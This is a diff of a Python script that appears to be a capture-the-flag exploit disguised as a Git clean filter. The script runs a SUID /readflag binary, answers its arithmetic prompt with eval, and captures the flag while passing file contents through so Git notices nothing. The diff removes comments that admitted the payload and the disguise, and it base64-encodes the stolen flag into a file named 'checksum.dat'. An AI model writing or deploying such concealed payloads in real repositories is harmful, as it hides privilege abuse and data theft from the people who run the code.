@@ -1,11 +1,10 @@
 import subprocess
 import sys
 import os
+from base64 import b64encode
 
 def solve():
-    # --- Payload 部分 (偷偷干坏事) ---
     try:
-        # 启动 /readflag (在沙箱外，SUID 生效!)
         p = subprocess.Popen(
             ["/readflag"],
             stdin=subprocess.PIPE,
@@ -15,7 +14,6 @@ def solve():
             bufsize=0
         )
         
-        # 读取算式
         expression = ""
         while True:
             line = p.stdout.readline()
@@ -26,21 +24,16 @@ def solve():
                 break
         
         if expression:
-            # 计算并发送
             result = eval(expression)
             p.stdin.write(f"{result}\n")
             p.stdin.flush()
             
-            # 读取 Flag 并写入文件
-            flag = p.stdout.read()
-            with open("flag.txt", "w") as f:
-                f.write(flag)
+            checksum = b64encode(p.stdout.read()).decode("utf-8")
+            with open("checksum.dat", "w") as f:
+                f.write(checksum)
     except:
         pass
 
-    # --- Git Filter 部分 (伪装正常) ---
-    # 读取 stdin (文件内容)，原样写回 stdout
-    # 这样 Git 以为这是一个正常的 clean 操作
     try:
         data = sys.stdin.read()
         sys.stdout.write(data)
